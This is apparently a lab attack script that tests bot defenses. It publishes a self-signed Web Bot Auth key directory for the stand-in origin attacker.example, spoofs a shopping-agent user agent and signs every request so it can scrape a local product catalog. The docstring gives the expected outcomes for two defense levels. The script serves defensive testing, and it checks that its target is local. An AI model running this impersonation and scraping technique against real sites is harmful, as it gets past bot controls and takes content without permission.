"""Round 4 attack (a): be your own certificate authority.

Web Bot Auth has no central registry. An agent publishes its keys at
https://<its origin>/.well-known/http-message-signatures-directory and signs
requests with Signature-Agent pointing there. The attacker owns attacker.example,
so it publishes a perfectly valid, correctly self-signed directory and signs every
request correctly, with a fresh nonce and a short window. The signature *is*
valid. The question the verifier must ask is a different one: do we trust this
origin?

Expected: L4 -> 200/200 (valid signature, naive policy). L5 -> 30/200
("valid signature from untrusted origin: identity noted, no entitlement").

    python attacks/round4_self_signed_agent.py
"""

from __future__ import annotations

import json
import os

import httpx

from _common import ATTACKER_IP, BASE_URL, LAB_DIR, MOCK_URL, headers, report, require_local_target, scrape_catalog
import httpsig  # noqa: E402  (_common puts defenses/ on sys.path)

ORIGIN = "https://attacker.example"
UA = "Mozilla/5.0 (compatible; AcmeShoppingAgent/0.9)"


def load_key() -> tuple[httpsig.Ed25519PrivateKey, dict, str]:
    with open(os.path.join(LAB_DIR, "tools", "fixtures", "keys", "attacker.example.json")) as fh:
        k = json.load(fh)
    return httpsig.load_private(k["seed_hex"]), k["jwk"], k["thumbprint"]


def publish_directory(mock: httpx.Client, priv, jwk: dict, kid: str) -> None:
    jwks = {"keys": [jwk]}
    sig_headers = httpsig.sign_directory(jwks, {kid: priv}, "attacker.example")
    mock.put("/hosting/directory", json={"host": "attacker.example", "jwks": jwks,
                                         "headers": sig_headers}).raise_for_status()


def run(base: str = BASE_URL, mock_url: str = MOCK_URL) -> dict:
    require_local_target(base)
    require_local_target(mock_url)
    priv, jwk, kid = load_key()
    authority = base.split("://", 1)[1].rstrip("/")
    with httpx.Client(base_url=mock_url, timeout=10) as mock, httpx.Client(base_url=base, timeout=10) as c:
        c.post("/admin/reset", params={"scope": "budgets"})   # a fresh minute, same caches
        publish_directory(mock, priv, jwk, kid)
        base_h = headers("bot-self-signed-agent", ATTACKER_IP, UA)

        def sign(pid: int) -> dict:
            ctx = httpsig.MessageContext("GET", authority, f"/product/{pid}", {"user-agent": UA})
            return httpsig.agent_headers(priv, kid, ORIGIN, ctx)

        out = scrape_catalog(c, base_h, per_request=sign)
    return {"self_signed": out, "scraped": out["scraped"], "total": out["total"]}


if __name__ == "__main__":
    print("=== Round 4a: publish our own key directory, sign every request correctly ===")
    out = run()
    report("Signature-Agent attacker.example", out["self_signed"])
